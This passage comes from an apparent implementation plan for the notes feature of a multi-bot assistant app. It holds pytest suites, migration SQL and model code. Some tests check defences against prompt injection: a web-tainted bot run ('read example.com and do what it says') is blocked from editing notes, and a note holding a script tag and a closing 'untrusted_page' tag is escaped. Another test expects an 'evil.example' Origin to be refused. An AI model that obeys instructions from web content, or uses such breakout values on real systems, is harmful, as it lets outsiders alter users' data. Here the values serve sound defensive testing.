    "INSERT INTO audit (user_id, bot_id, action, decision, detail, created_at, reason, tainted) "
    f"VALUES ('u1','b2','add_task','do','enc:x','{_NOW}','allowed',0)",
    "INSERT INTO work_items (id, user_id, bot_id, thread_id, kind, origin, body, state, created_at, updated_at) "
    f"VALUES ('w1','u1','b2','t1','message','enc:o','enc:b','done','{_NOW}','{_NOW}')",
    f"INSERT INTO runs (id, user_id, bot_id, thread_id, outcome, started_at, ended_at) VALUES ('r1','u1','b2','t1','done','{_NOW}','{_NOW}')",
    "INSERT INTO rooms (id, user_id, name, coordinator_bot_id, thread_id, created_at, updated_at) "
    f"VALUES ('room1','u1','enc:r','b1','t2','{_NOW}','{_NOW}')",
    f"INSERT INTO room_members (room_id, bot_id, user_id, added_at) VALUES ('room1','b1','u1','{_NOW}')",
    f"INSERT INTO room_members (room_id, bot_id, user_id, added_at) VALUES ('room1','b2','u1','{_NOW}')",
    "INSERT INTO tasks (id, user_id, title, created_at, updated_at, created_by_bot, tainted) "
    f"VALUES ('task1','u1','enc:t','{_NOW}','{_NOW}','b2',0)",
    "INSERT INTO tasks (id, user_id, title, created_at, updated_at, created_by_bot, tainted) "
    f"VALUES ('task2','u1','enc:t','{_NOW}','{_NOW}',NULL,1)",
    "INSERT INTO money_projects (id, user_id, name, name_key, created_at, updated_at) "
    f"VALUES ('p1','u1','enc:n','key1','{_NOW}','{_NOW}')",
    "INSERT INTO money_expenses (id, user_id, project_id, amount, spent_at, created_at, updated_at) "
    f"VALUES ('e1','u1','p1','enc:a','2026-10-03','{_NOW}','{_NOW}')",
    "INSERT INTO money_topups (id, user_id, project_id, amount, created_at, updated_at) "
    f"VALUES ('top1','u1','p1','enc:a','{_NOW}','{_NOW}')",
)


def _seed_v8_database(db_path: Path) -> None:
    db_path.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(db_path)
    try:
        con.execute("PRAGMA foreign_keys = ON")
        con.executescript(_V8_SCHEMA.read_text())
        con.execute("PRAGMA user_version = 8")
        for statement in _ROWS:
            con.execute(statement)
        con.commit()
    finally:
        con.close()


def _query(db_path: Path, sql: str, params: tuple = ()) -> list[tuple]:
    con = sqlite3.connect(db_path)
    try:
        return con.execute(sql, params).fetchall()
    finally:
        con.close()


def _counts(db_path: Path) -> dict[str, int]:
    return {table: _query(db_path, f"SELECT COUNT(*) FROM {table}")[0][0] for table in _EXPECTED}


def _version(db_path: Path) -> int:
    return _query(db_path, "PRAGMA user_version")[0][0]


def _columns(db_path: Path, table: str) -> dict[str, tuple]:
    return {row[1]: row for row in _query(db_path, f"PRAGMA table_info({table})")}


@pytest.fixture
def seeded_v8():
    cfg = load_config()
    db_path = get_db_path(cfg)
    _seed_v8_database(db_path)
    assert _version(db_path) == 8
    return cfg, db_path


async def test_v8_database_migrates_to_latest_and_keeps_every_row(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    assert _version(db_path) == latest_version()
    assert _counts(db_path) == _EXPECTED


async def test_migrating_v8_twice_is_a_no_op(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    await init_db(cfg)
    assert _counts(db_path) == _EXPECTED
    assert _version(db_path) == latest_version()


async def test_a_v8_database_is_backed_up_before_migrating(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    [backup] = sorted(db_path.parent.glob("roost.db.pre-v*.bak"))
    assert _version(backup) == 8
    assert _counts(backup) == _EXPECTED


async def test_v9_adds_an_empty_notes_table_with_provenance_and_a_revision(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    assert _query(db_path, "SELECT COUNT(*) FROM notes") == [(0,)]
    columns = _columns(db_path, "notes")
    assert {"user_id", "title", "title_key", "content", "tags", "pinned", "revision", "created_at", "updated_at",
            "deleted_at", "created_by_bot", "tainted"} <= set(columns)
    assert columns["revision"][3] == 1 and columns["tainted"][3] == 1   # NOT NULL


async def test_retiring_a_bot_keeps_the_users_notes(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    con = sqlite3.connect(db_path)
    try:
        con.execute("PRAGMA foreign_keys = ON")
        con.execute("INSERT INTO notes (id, user_id, title, title_key, content, created_at, updated_at, created_by_bot) "
                    f"VALUES ('n1','u1','enc:t','k','enc:c','{_NOW}','{_NOW}','b2')")
        con.execute("DELETE FROM bots WHERE id = 'b2'")
        con.commit()
    finally:
        con.close()
    assert _query(db_path, "SELECT id, created_by_bot FROM notes") == [("n1", None)]
```

`tests/test_note_text.py`:

```python
"""The harvested note text helpers (M2 D1): wikilinks, front matter, tags, titles, folding."""

from __future__ import annotations

from roost.notes.frontmatter import parse_frontmatter
from roost.notes.text import capped_tags, fold, merge_tags, note_title
from roost.notes.wikilinks import extract_wikilinks, extract_wikilinks_full, normalize_page


def test_wikilinks_are_folded_deduplicated_and_code_is_skipped():
    md = "See [[Ana]] and [[ ana ]], [[Garden|my garden]] but not `[[code]]`."
    assert extract_wikilinks(md) == ["ana", "garden"]
    assert [(link.raw_target, link.display) for link in extract_wikilinks_full(md)] == [("Ana", ""), ("Garden", "my garden")]
    assert normalize_page("  Ana   García ") == "ana garcía"


def test_tags_merge_explicit_front_matter_and_hashtags_once():
    md = "---\ntags: [family, People]\n---\nAna likes #orchids and #Family"
    assert merge_tags(["#people"], md) == ["people", "family", "orchids"]


def test_tags_are_capped_in_count_and_length():
    many = [f"t{i}" for i in range(30)] + ["x" * 60]
    capped = capped_tags(many)
    assert len(capped) == 20 and all(len(tag) <= 40 for tag in capped)


def test_a_note_title_comes_from_the_first_line_after_front_matter():
    assert note_title(None, "---\ntags: [x]\n---\n# Ana\nlikes orchids") == "Ana"
    assert note_title("  Garden ", "body") == "Garden"
    assert note_title("", "   ") == "Untitled note"


def test_fold_ignores_case_and_accents():
    assert fold("Cumpleaños ORQUÍDEAS") == "cumpleanos orquideas"


def test_front_matter_is_split_from_the_body():
    props, body, has = parse_frontmatter("---\ntags: [a, b]\n---\nBody")
    assert (props["tags"], body, has) == (["a", "b"], "Body", True)
```

`tests/test_note_store.py`:

```python
"""NoteStore (M2 D1, D5): the user's notes, encrypted, revisioned, shared by every bot."""

from __future__ import annotations

import sqlite3

import pytest

from roost.bots.store import BotStore
from roost.config import load_config
from roost.db.connection import get_db_path, init_db
from roost.gateway.auth import register_user
from roost.notes.models import Note, NoteDraft, NotePatch
from roost.notes.search import rank_notes
from roost.notes.store import NoteStore
from roost.records.revision import RevisionConflict
from team_helpers import make_bot


@pytest.fixture
async def cfg():
    config = load_config()
    await init_db(config)
    return config


@pytest.fixture
async def user_id(cfg):
    return (await register_user(cfg, "alice", "pw-123456")).id


async def _add(cfg, user_id, title="Ana", content="likes orchids", *, tainted=False, bot=None) -> Note:
    return await NoteStore(cfg).create(user_id, NoteDraft(title=title, content=content, tags=("people",)),
                                       created_by_bot=bot, tainted=tainted)


async def test_a_note_is_stored_encrypted_with_an_hmac_title_key(cfg, user_id):
    note = await _add(cfg, user_id)
    con = sqlite3.connect(get_db_path(cfg))
    try:
        title, key, content, tags, revision = con.execute(
            "SELECT title, title_key, content, tags, revision FROM notes WHERE id = ?", (note.id,)).fetchone()
    finally:
        con.close()
    assert all(value.startswith("enc:v2:") for value in (title, content, tags))
    assert "ana" not in key.lower() and len(key) == 64 and revision == 1
    assert await NoteStore(cfg).get(user_id, note.id) == note


async def test_an_exact_title_finds_the_note_whatever_its_case_and_spacing(cfg, user_id):
    note = await _add(cfg, user_id, title="Ana García")
    assert [n.id for n in await NoteStore(cfg).with_title(user_id, "  ana   garcía ")] == [note.id]
    assert await NoteStore(cfg).with_title(user_id, "Ana") == ()


async def test_a_stale_revision_is_refused_with_the_current_note(cfg, user_id):
    store = NoteStore(cfg)
    note = await _add(cfg, user_id, content="v1")
    saved = await store.update(user_id, note.id, NotePatch({"content": "v2"}), base_revision=1)
    assert (saved.content, saved.revision) == ("v2", 2)
    with pytest.raises(RevisionConflict) as caught:
        await store.update(user_id, note.id, NotePatch({"content": "stale"}), base_revision=1)
    assert caught.value.current.content == "v2"
    assert (await store.get(user_id, note.id)).content == "v2"


async def test_a_write_landing_between_read_and_write_is_a_conflict_not_a_clobber(cfg, user_id, monkeypatch):
    store, other = NoteStore(cfg), NoteStore(cfg)
    note = await _add(cfg, user_id, content="v1")
    real_get, raced = store.get, []

    async def get_then_race(uid: str, nid: str):
        found = await real_get(uid, nid)
        if not raced:
            raced.append(True)
            await other.update(uid, nid, NotePatch({"content": "theirs"}))
        return found

    monkeypatch.setattr(store, "get", get_then_race)
    with pytest.raises(RevisionConflict) as caught:
        await store.update(user_id, note.id, NotePatch({"content": "mine"}))
    assert caught.value.current.content == "theirs"


async def test_another_user_sees_and_changes_nothing(cfg, user_id):
    bob = (await register_user(cfg, "bob", "pw-123456")).id
    store = NoteStore(cfg)
    note = await _add(cfg, user_id)
    assert await store.get(bob, note.id) is None
    assert await store.list(bob) == ()
    assert await store.update(bob, note.id, NotePatch({"content": "x"})) is None
    assert await store.delete(bob, note.id) is False
    assert (await store.get(user_id, note.id)).content == "likes orchids"


async def test_keep_clears_the_taint_without_a_new_revision_and_delete_is_soft(cfg, user_id):
    store = NoteStore(cfg)
    note = await _add(cfg, user_id, tainted=True)
    kept = await store.keep(user_id, note.id)
    assert (kept.tainted, kept.revision) == (False, 1)
    assert await store.delete(user_id, note.id) is True
    assert await store.get(user_id, note.id) is None
    assert await store.delete(user_id, note.id) is False


async def test_retiring_the_bot_keeps_the_users_notes(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    note = await _add(cfg, user_id, bot=bot.id)
    await BotStore(cfg).delete(user_id, bot.id)
    [kept] = await NoteStore(cfg).list(user_id)
    assert (kept.id, kept.created_by_bot) == (note.id, None)


def _note(note_id: str, title: str, content: str, *, tags=(), updated="2026-10-01T00:00:00+00:00") -> Note:
    return Note(id=note_id, user_id="u", title=title, content=content, tags=tuple(tags), pinned=False, revision=1,
                created_at=updated, updated_at=updated, created_by_bot=None, tainted=False)


def test_search_ignores_case_and_accents():
    ana = _note("n1", "Ana", "Cumpleaños el 3 de mayo; le gustan las orquídeas.")
    assert rank_notes((ana,), "cumpleanos ORQUIDEAS", limit=10) == (ana,)


def test_every_query_word_must_match():
    assert rank_notes((_note("n1", "Ana", "likes orchids"),), "orchids roses", limit=10) == ()


def test_more_matches_rank_first_then_the_newest():
    newer = _note("n1", "Shopping", "orchids", updated="2026-10-10T00:00:00+00:00")
    older = _note("n2", "Shopping again", "orchids", updated="2026-10-01T00:00:00+00:00")
    titled = _note("n3", "Orchids", "how to water them", updated="2026-09-01T00:00:00+00:00")
    assert [n.id for n in rank_notes((newer, older, titled), "orchids", limit=10)] == ["n3", "n1", "n2"]


def test_an_empty_query_lists_newest_first_and_a_tag_filters():
    tagged, plain = _note("n1", "A", "x", tags=("people",)), _note("n2", "B", "y")
    assert rank_notes((tagged, plain), "", limit=10) == (tagged, plain)
    assert rank_notes((tagged, plain), "  ", tag="#People", limit=10) == (tagged,)
    assert rank_notes((tagged, plain), "", limit=1) == (tagged,)
```

`tests/test_note_tools.py`:

```python
"""The notes role end to end (M2 D1): a bot's tools over the user's shared notes."""

from __future__ import annotations

import pytest

from roost.config import load_config
from roost.db.connection import init_db
from roost.gateway.auth import register_user
from roost.llm.types import ToolCallRequested, TurnDone
from roost.notes.models import NoteDraft
from roost.notes.store import NoteStore
from roost.talk.gate import REFUSAL_TEXT, TAINTED_CHANGE_TEXT
from team_helpers import make_bot, make_rig, say, send, team_model, wait_idle


@pytest.fixture
async def cfg():
    config = load_config()
    await init_db(config)
    return config


@pytest.fixture
async def user_id(cfg):
    return (await register_user(cfg, "alice", "pw-123456")).id


def _tool(call_id: str, name: str, **arguments):
    return [ToolCallRequested(id=call_id, name=name, arguments=arguments), TurnDone("tool_use")]


async def _talk(cfg, user_id, bot, script: dict, text: str):
    rig = make_rig(cfg, team_model(script))
    thread = await rig.talk.create_thread(user_id, bot.id)
    await send(rig, user_id, bot.id, thread.id, text)
    await wait_idle(rig.runner)
    return rig, thread


def _tool_texts(request) -> list[str]:
    return [turn.text for turn in request.turns if turn.role == "tool"]


async def _seed(cfg, user_id, title: str, content: str, *, tainted: bool = False):
    return await NoteStore(cfg).create(user_id, NoteDraft(title=title, content=content), created_by_bot=None,
                                       tainted=tainted)


async def test_note_anas_birthday_then_find_it_by_orchids(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    await _talk(cfg, user_id, bot, {"Writer": [
        _tool("a", "add_note", title="Ana", content="Ana's birthday is 3 May. She likes orchids.", tags=["people"]),
        say("Saved to [[Ana]]."),
    ]}, "note: Ana's birthday is 3 May, she likes orchids")
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [_tool("f", "find_notes", query="orchids"), say("One note.")]},
                         "what do I know about orchids?")
    found = _tool_texts(rig.model.requests[-1])[0]
    assert "“Ana”" in found and "[people]" in found and "orchids" in found
    [note] = await NoteStore(cfg).list(user_id)
    assert (note.created_by_bot, note.tainted, note.tags) == (bot.id, False, ("people",))


async def test_two_bots_with_the_notes_role_share_the_users_notes(cfg, user_id):
    writer = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    helper = await make_bot(cfg, user_id, "Helper", roles=("notes", "tasks"))
    await _talk(cfg, user_id, writer, {"Writer": [_tool("a", "add_note", content="Wifi password is on the fridge"),
                                                  say("ok")]}, "note it")
    rig, _ = await _talk(cfg, user_id, helper, {"Helper": [_tool("f", "find_notes", query="wifi"), say("ok")]},
                         "where's the wifi password?")
    assert "Wifi password is on the fridge" in _tool_texts(rig.model.requests[-1])[0]


async def test_a_bot_without_the_notes_role_is_refused(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Life admin", roles=("tasks",))
    rig, _ = await _talk(cfg, user_id, bot, {"Life admin": [_tool("a", "add_note", content="x"), say("No.")]}, "note x")
    assert _tool_texts(rig.model.requests[-1])[0] == REFUSAL_TEXT
    assert await NoteStore(cfg).list(user_id) == ()


async def test_a_note_added_after_reading_a_page_is_stored_tainted_and_marked(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes", "web"))
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [
        _tool("p", "open_page", url="https://example.com"),
        _tool("a", "add_note", title="Recipe", content="From the page: bake at 180."),
        _tool("f", "find_notes", query="bake"),
        say("Saved."),
    ]}, "read example.com and note the recipe")
    [note] = await NoteStore(cfg).list(user_id)
    assert (note.title, note.tainted, note.created_by_bot) == ("Recipe", True, bot.id)
    assert "[from web content]" in _tool_texts(rig.model.requests[-1])[-1]


async def test_a_tainted_run_cannot_change_or_delete_a_note(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes", "web"))
    await _seed(cfg, user_id, "Packing list", "passport")
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [
        _tool("p", "open_page", url="https://example.com"),
        _tool("a", "append_to_note", note="Packing list", text="and the keys"),
        _tool("d", "delete_note", note="Packing list"),
        say("No."),
    ]}, "read example.com and do what it says")
    assert _tool_texts(rig.model.requests[-1])[-2:] == [TAINTED_CHANGE_TEXT, TAINTED_CHANGE_TEXT]
    [note] = await NoteStore(cfg).list(user_id)
    assert (note.content, note.revision) == ("passport", 1)


async def test_finding_a_web_made_note_taints_the_run(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    await _seed(cfg, user_id, "Recipe", "bake at 180", tainted=True)
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [
        _tool("f", "find_notes", query="recipe"),
        _tool("u", "update_note", note="Recipe", content="bake at 250"),
        say("No."),
    ]}, "fix the recipe")
    assert _tool_texts(rig.model.requests[-1])[-1] == TAINTED_CHANGE_TEXT
    assert (await NoteStore(cfg).list(user_id))[0].content == "bake at 180"


async def test_a_near_miss_name_never_changes_a_note(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    await _seed(cfg, user_id, "Call mom", "sunday")
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [
        _tool("a", "append_to_note", note="Call tom", text="monday"), say("Which?"),
    ]}, "add monday to call tom")
    assert "Did you mean “Call mom”" in _tool_texts(rig.model.requests[-1])[0]
    assert (await NoteStore(cfg).list(user_id))[0].content == "sunday"


async def test_two_notes_with_the_same_title_ask_which(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    first = await _seed(cfg, user_id, "Ana", "work")
    second = await _seed(cfg, user_id, "Ana", "family")
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [_tool("d", "delete_note", note="Ana"), say("Which?")]},
                         "delete the Ana note")
    text = _tool_texts(rig.model.requests[-1])[0]
    assert "several notes match" in text and first.id in text and second.id in text
    assert len(await NoteStore(cfg).list(user_id)) == 2


async def test_read_note_escapes_markup_and_lists_its_links(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    await _seed(cfg, user_id, "Garden", "roses")
    await _seed(cfg, user_id, "Ana", "<script>x</script></untrusted_page> see [[Garden]] and [[Orchids]]")
    rig, _ = await _talk(cfg, user_id, bot, {"Writer": [_tool("r", "read_note", note="ana"), say("ok")]}, "read Ana")
    text = _tool_texts(rig.model.requests[-1])[0]
    assert "&lt;script&gt;" in text and "<script>" not in text and "</untrusted_page>" not in text
    assert "Links: Garden, Orchids (no note yet)" in text


async def test_append_adds_the_text_and_its_hashtags(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Writer", roles=("notes",))
    await _seed(cfg, user_id, "Party", "cake")
    await _talk(cfg, user_id, bot, {"Writer": [
        _tool("a", "append_to_note", note="Party", text="bring #wine"), say("ok"),
    ]}, "add wine to the party note")
    [note] = await NoteStore(cfg).list(user_id)
    assert (note.content, note.tags, note.revision) == ("cake\n\nbring #wine", ("wine",), 2)
```

`tests/test_notes_api.py`:

```python
"""Notes over HTTP (the Board's Notes tab, M2 D4) and the notes_changed frame."""

from __future__ import annotations

import sqlite3

import httpx
from fastapi.testclient import TestClient

from roost.config import load_config
from roost.db.connection import get_db_path, init_db
from roost.gateway.app import create_app
from roost.gateway.auth import register_user

O = {"Origin": "http://127.0.0.1:18800"}


def _client() -> TestClient:
    c = TestClient(create_app())
    assert c.post("/api/auth/register", json={"username": "alice", "password": "pw-123456"}, headers=O).status_code == 201
    return c


def _frames() -> list[str]:
    con = sqlite3.connect(get_db_path(load_config()))
    try:
        return [row[0] for row in con.execute("SELECT kind FROM events ORDER BY seq")]
    finally:
        con.close()


def test_create_search_read_save_and_delete():
    c = _client()
    garden = c.post("/api/notes", json={"title": "Garden", "content": "roses"}, headers=O).json()
    created = c.post("/api/notes", json={"content": "# Ana\nBirthday 3 May. Likes #orchids, see [[Garden]] and [[Lisbon]]."},
                     headers=O)
    assert created.status_code == 201
    ana = created.json()
    assert (ana["title"], ana["tags"], ana["revision"], ana["tainted"]) == ("Ana", ["orchids"], 1, False)
    assert ana["links"] == [{"target": "garden", "title": "Garden", "note_id": garden["id"]},
                            {"target": "lisbon", "title": "Lisbon", "note_id": None}]
    [hit] = c.get("/api/notes", params={"q": "ORCHIDS"}).json()
    assert hit["id"] == ana["id"] and "orchids" in hit["snippet"] and "content" not in hit
    saved = c.put(f"/api/notes/{ana['id']}", json={"base_revision": 1, "content": "# Ana\nLikes #roses"}, headers=O)
    assert (saved.json()["revision"], saved.json()["tags"]) == (2, ["orchids", "roses"])
    assert c.delete(f"/api/notes/{ana['id']}", headers=O).status_code == 204
    assert c.get(f"/api/notes/{ana['id']}").status_code == 404


def test_a_stale_note_save_is_409_with_the_current_note():
    c = _client()
    note = c.post("/api/notes", json={"title": "List", "content": "eggs"}, headers=O).json()
    assert c.put(f"/api/notes/{note['id']}", json={"base_revision": 1, "content": "eggs, milk"}, headers=O).status_code == 200
    stale = c.put(f"/api/notes/{note['id']}", json={"base_revision": 1, "content": "eggs, bread"}, headers=O)
    assert stale.status_code == 409
    assert (stale.json()["current"]["content"], stale.json()["current"]["revision"]) == ("eggs, milk", 2)
    assert c.get(f"/api/notes/{note['id']}").json()["content"] == "eggs, milk"


def test_every_change_publishes_notes_changed():
    c = _client()
    note = c.post("/api/notes", json={"title": "A", "content": "x"}, headers=O).json()
    c.put(f"/api/notes/{note['id']}", json={"base_revision": 1, "title": "B"}, headers=O)
    c.delete(f"/api/notes/{note['id']}", headers=O)
    assert _frames().count("notes_changed") == 3


def test_a_note_needs_a_title_or_text_and_stays_under_the_limit():
    c = _client()
    assert c.post("/api/notes", json={"content": ""}, headers=O).status_code == 422
    assert c.post("/api/notes", json={"content": "x" * 100_001}, headers=O).status_code == 422
    assert c.post("/api/notes", json={"title": "Untitled note"}, headers=O).status_code == 201


def test_mutations_need_the_origin_and_a_login():
    c = _client()
    assert c.post("/api/notes", json={"content": "x"}, headers={"Origin": "http://evil.example"}).status_code == 403
    assert TestClient(create_app()).get("/api/notes").status_code == 401


async def test_another_users_note_is_404():
    app = create_app()
    cfg = load_config()
    await init_db(cfg)
    for name in ("alice", "bob"):
        await register_user(cfg, name, "pw-123456")
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://roost.test") as alice, \
            httpx.AsyncClient(transport=transport, base_url="http://roost.test") as bob:
        for client, name in ((alice, "alice"), (bob, "bob")):
            await client.post("/api/auth/login", json={"username": name, "password": "pw-123456"}, headers=O)
        note = (await alice.post("/api/notes", json={"content": "mine"}, headers=O)).json()
        assert (await bob.get(f"/api/notes/{note['id']}")).status_code == 404
        assert (await bob.put(f"/api/notes/{note['id']}", json={"base_revision": 1, "content": "x"}, headers=O)).status_code == 404
        assert (await bob.delete(f"/api/notes/{note['id']}", headers=O)).status_code == 404
        assert (await bob.get("/api/notes")).json() == []


async def test_keep_vouches_for_a_web_made_note():
    from roost.notes.models import NoteDraft
    from roost.notes.store import NoteStore

    app = create_app()
    cfg = load_config()
    await init_db(cfg)
    alice_id = (await register_user(cfg, "alice", "pw-123456")).id
    note = await NoteStore(cfg).create(alice_id, NoteDraft(title="Recipe", content="bake"), created_by_bot=None,
                                       tainted=True)
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://roost.test") as alice:
        await alice.post("/api/auth/login", json={"username": "alice", "password": "pw-123456"}, headers=O)
        kept = await alice.post(f"/api/notes/{note.id}/keep", headers=O)
        assert (kept.status_code, kept.json()["tainted"]) == (200, False)
```

In `tests/test_suggest_bot.py:150` change the expected enum to `["finance", "notes", "tasks", "web"]`.

- [ ] **Step 5: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_migrations_v8.py tests/test_note_text.py tests/test_note_store.py tests/test_note_tools.py tests/test_notes_api.py tests/test_suggest_bot.py -q`
Expected: FAIL. You should see `no such table: notes`, `ModuleNotFoundError: roost.notes.models` (or `roost.records.revision`), an `ImportError` for `capped_tags` from the bare harvested `text.py`, 404s on `/api/notes`, and the suggest_bot enum missing `"notes"`.

- [ ] **Step 6: Constants, the conflict type and Migration 9**

Append to `roost/constants.py`:

```python
# ---------------------------------------------------------------------------
# Notes role (roost/notes/*) — M2 D1
# ---------------------------------------------------------------------------

MAX_NOTE_TITLE_LENGTH = 200
MAX_NOTE_CONTENT_LENGTH = 100_000
MAX_NOTE_TAGS = 20
MAX_NOTE_TAG_LENGTH = 40
MAX_NOTE_QUERY_LENGTH = 200
# Search decrypts up to this many of the user's newest notes and matches in Python (D1).
NOTE_SCAN_LIMIT = 2000
NOTE_LIST_LIMIT = 200
NOTE_FIND_LIMIT = 10
NOTE_SNIPPET_CHARS = 160
NOTE_READ_MAX_CHARS = 8000
NOTE_LINKS_MAX = 50
```

Create `roost/records/revision.py`:

```python
"""A compare-and-swap miss on a revisioned record (M2 D1/D2): the revision a
writer read is no longer the stored one. ``current`` is the stored record, so
the Board can offer "Load the latest" or "Keep mine" and a tool can say
"read it again" — a stale write never silently overwrites a newer one."""

from __future__ import annotations

from typing import Generic, TypeVar

T = TypeVar("T")


class RevisionConflict(Exception, Generic[T]):
    def __init__(self, current: T) -> None:
        super().__init__("The record changed since it was read.")
        self.current = current
```

In `roost/db/migrations.py` add before `MIGRATIONS` and append the entry:

```python
# Column names and meanings follow LazyClaw's notes table (title, content, tags,
# pinned, title_key) so M4 can import the user's LazyBrain notes. Title, content
# and tags are enc:v2; title_key is HMAC(dek, folded title), never the title;
# revision is the compare-and-swap counter every content write bumps.
_NOTES = """
CREATE TABLE IF NOT EXISTS notes (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    title TEXT NOT NULL,
    title_key TEXT NOT NULL,
    content TEXT NOT NULL,
    tags TEXT,
    pinned INTEGER NOT NULL DEFAULT 0,
    revision INTEGER NOT NULL DEFAULT 1,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL,
    deleted_at TEXT,
    created_by_bot TEXT REFERENCES bots(id) ON DELETE SET NULL,
    tainted INTEGER NOT NULL DEFAULT 0
)"""
```

```python
    Migration(9, "notes", (
        _NOTES,
        "CREATE INDEX IF NOT EXISTS idx_notes_user_updated ON notes(user_id, updated_at)",
        "CREATE INDEX IF NOT EXISTS idx_notes_user_title ON notes(user_id, title_key)",
    )),
```

- [ ] **Step 7: Adapt `roost/notes/text.py`** (the two header lines stay; function bodies stay verbatim except where marked Roost)

```python
# SPDX-License-Identifier: MIT
# Harvested from LazyClaw lazyclaw/lazybrain/store.py lines 201-216, 297-320 @ 21e1002, adapted for Roost

"""Note text helpers (M2 D1): accent-blind folding for search, the tag merge
(the caller's tags, the front matter's ``tags:`` and ``#hashtags``) and the
first-line title — LazyBrain's own rules, so M4's imported notes behave the same."""

from __future__ import annotations

import unicodedata
from typing import Iterable

from roost.constants import MAX_NOTE_TAG_LENGTH, MAX_NOTE_TAGS, MAX_NOTE_TITLE_LENGTH
from roost.notes.frontmatter import parse_frontmatter
from roost.notes.wikilinks import extract_tags

UNTITLED_NOTE = "Untitled note"


def fold(s: str) -> str:
    """Lowercase + strip combining diacritics for substring search.

    Folds Latin accents ("Asistència" → "asistencia", "café" → "cafe")
    so multilingual search isn't case- or accent-sensitive. Non-Latin
    scripts (Georgian, Cyrillic, Arabic, CJK) carry no combining marks
    and pass through unchanged, so this is safe for the user's
    Latin-Georgian transliteration as well.
    """
    if not s:
        return ""
    return "".join(
        c for c in unicodedata.normalize("NFKD", s)
        if not unicodedata.combining(c)
    ).lower()


def _front_matter_tags(markdown: str) -> list[str]:
    """Roost: a ``tags:`` key in the note's front matter counts as tags too."""
    props, _body, _has = parse_frontmatter(markdown)
    raw = props.get("tags")
    if isinstance(raw, list):
        return [str(tag) for tag in raw]
    return [raw] if isinstance(raw, str) and raw else []


def merge_tags(explicit: Iterable[str] | None, markdown: str) -> list[str]:
    """Tags from the caller plus #hashtags scraped from markdown body."""
    combined: list[str] = []
    seen: set[str] = set()
    for t in [*(explicit or []), *_front_matter_tags(markdown)]:
        norm = t.lstrip("#").strip().lower()
        if norm and norm not in seen:
            combined.append(norm)
            seen.add(norm)
    for t in extract_tags(markdown):
        if t not in seen:
            combined.append(t)
            seen.add(t)
    return combined


def capped_tags(tags: Iterable[str]) -> tuple[str, ...]:
    """Roost: at most MAX_NOTE_TAGS tags of at most MAX_NOTE_TAG_LENGTH characters."""
    return tuple(tag[:MAX_NOTE_TAG_LENGTH] for tag in list(tags)[:MAX_NOTE_TAGS])


def first_line(markdown: str) -> str | None:
    """Derive a title from the first non-empty line if caller didn't supply one."""
    for line in markdown.splitlines():
        stripped = line.strip().lstrip("#").strip()
        if stripped:
            return stripped[:200]
    return None


def note_title(title: str | None, content: str) -> str:
    """Roost: the caller's title, else the body's first line after any front matter."""
    _props, body, _has = parse_frontmatter(content)
    chosen = (title or "").strip() or first_line(body) or UNTITLED_NOTE
    return chosen[:MAX_NOTE_TITLE_LENGTH]
```

- [ ] **Step 8: Models, store, search, format, service**

`roost/notes/__init__.py`: `"""Notes role (M2 D1): the user's shared, encrypted notes."""`

`roost/notes/models.py`:

```python
"""Note domain model (M2 D1) — frozen dataclasses. Column names and meanings
follow LazyClaw's ``notes`` table (title, content, tags, pinned, title_key) so
M4 can import the user's LazyBrain notes."""

from __future__ import annotations

from dataclasses import dataclass, field
from types import MappingProxyType
from typing import Any, Mapping

NOTE_PATCHABLE = frozenset({"title", "content", "tags", "pinned"})


@dataclass(frozen=True)
class Note:
    id: str
    user_id: str
    title: str
    content: str                  # markdown; may open with a --- front-matter block
    tags: tuple[str, ...]
    pinned: bool
    revision: int                 # bumped by every content write: the compare-and-swap counter
    created_at: str
    updated_at: str
    created_by_bot: str | None    # NULL: the user, or a retired bot
    tainted: bool                 # written by a run that read outside content


@dataclass(frozen=True)
class NoteDraft:
    title: str
    content: str
    tags: tuple[str, ...] = ()
    pinned: bool = False


@dataclass(frozen=True)
class NotePatch:
    changes: Mapping[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        unknown = set(self.changes) - NOTE_PATCHABLE
        if unknown:
            raise ValueError(f"Notes can't change {', '.join(sorted(unknown))}.")
        object.__setattr__(self, "changes", MappingProxyType(dict(self.changes)))


@dataclass(frozen=True)
class NoteLink:
    target: str                   # the folded [[target]] (normalize_page)
    title: str                    # the target as written
    note_id: str | None           # the note with that title; None: no such note yet
```

`roost/notes/store.py`:

```python
"""``NoteStore`` — the user's notes, encrypted (M2 D1, D5).

Notes belong to the USER: every bot holding the notes role reads and writes the
same rows, scoped by ``user_id`` only, each with ``created_by_bot`` and a taint
bit (M1's provenance). Title, content and tags are ``enc:v2`` under
``notes:<column>``; ``title_key`` is HMAC(dek, folded title), so an exact title
or a ``[[wikilink]]`` is found without the title ever being stored in plaintext.
